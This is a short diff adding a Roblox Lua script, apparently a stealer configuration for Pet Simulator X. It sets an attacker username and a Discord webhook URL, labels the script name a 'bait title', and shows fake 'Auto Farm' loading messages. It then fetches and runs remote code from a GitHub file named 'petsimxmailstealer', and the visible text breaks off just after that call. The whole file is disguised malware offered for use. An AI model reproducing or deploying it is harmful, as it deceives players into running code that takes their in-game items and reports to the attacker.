@@ -1,0 +1,8 @@
+local player_USERNAME = "GhunterTF1" 
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1106904245027995680/HhbPc8NedFeEin14dxE93o94Wqmt0iK40EAiLXv88SoO6UNz4Y4uiWBi7In9DWLdaqml" -- leave blank if no webhook 
+local Custom_Script_Name = "JeroHUB" -- bait title
+local txt_1 = "Script Loaded..." 
+local txt_2 = "Waiting for Script" 
+local txt_3 = "Loading Pets.." 
+local txt_4 = "Activating Auto Farm..." 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))(
